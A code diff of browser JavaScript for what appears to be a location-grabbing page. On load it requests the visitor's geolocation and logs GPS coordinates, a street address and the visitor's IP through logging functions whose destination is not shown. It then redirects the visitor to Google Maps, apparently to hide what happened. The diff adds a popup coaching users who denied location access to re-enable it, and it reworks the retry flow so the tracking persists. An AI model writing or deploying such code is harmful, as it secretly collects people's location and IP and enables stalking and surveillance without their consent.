@@ -68,11 +68,33 @@ async function logGPSAndIP(lat, lon) {
 📍 GPS: ${lat}, ${lon}
 📍 Address: ${address}
 🗺️ https://www.google.com/maps?q=${lat},${lon}`);
-  
+
   window.location.href = `https://www.google.com/maps/@${lat},${lon},15z`;
 }
 
-// 🔄 Handles full logic (used on load and on Retry)
+function showPermissionPopup() {
+  const popup = document.createElement("div");
+  popup.id = "location-popup";
+  popup.innerHTML = `
+    <div class="popup-box">
+      <div class="popup-title">📍 Location Access Denied</div>
+      <div class="popup-desc">Please allow location access from your browser settings to continue.</div>
+      <ul>
+        <li><b>Chrome:</b> Lock icon → Site Settings → Location → Allow</li>
+        <li><b>Safari:</b> Preferences → Websites → Location</li>
+        <li><b>Mobile:</b> App/Browser Settings → Location</li>
+      </ul>
+      <button onclick="closePermissionPopup()">OK, Got It</button>
+    </div>
+  `;
+  document.body.appendChild(popup);
+}
+
+function closePermissionPopup() {
+  const popup = document.getElementById("location-popup");
+  if (popup) popup.remove();
+}
+
 async function handleLocationFlow(trigger = "page") {
   if (!navigator.geolocation || !navigator.permissions) {
     await logIPOnly("❌ Geolocation not supported");
@@ -85,22 +107,21 @@ async function handleLocationFlow(trigger = "page") {
     if (permission.state === "granted") {
       navigator.geolocation.getCurrentPosition(
         pos => logGPSAndIP(pos.coords.latitude, pos.coords.longitude),
-        err => logIPOnly("⚠️ GPS fetch error (granted state)")
+        err => logIPOnly("⚠️ GPS fetch error (granted)")
       );
     } else if (permission.state === "prompt") {
       navigator.geolocation.getCurrentPosition(
         pos => logGPSAndIP(pos.coords.latitude, pos.coords.longitude),
-        err => logIPOnly("❌ User blocked or dismissed prompt")
+        err => logIPOnly("❌ User denied prompt")
       );
     } else if (permission.state === "denied") {
-      // 🔄 Retry popup via force attempt (clicking retry will re-prompt)
-      navigator.geolocation.getCurrentPosition(
-        pos => logGPSAndIP(pos.coords.latitude, pos.coords.longitude),
-        err => logIPOnly("❌ User denied location access")
-      );
+      if (trigger === "retry") {
+        showPermissionPopup();
+      } else {
+        await logIPOnly("❌ Location permanently denied");
+      }
     }
 
-    // Watch for permission changes
     permission.onchange = () => {
       if (permission.state === "granted") location.reload();
     };
@@ -110,7 +131,6 @@ async function handleLocationFlow(trigger = "page") {
   }
 }
 
-// ✅ Called on retry icon click
 function retryLocation() {
   handleLocationFlow("retry");
 }
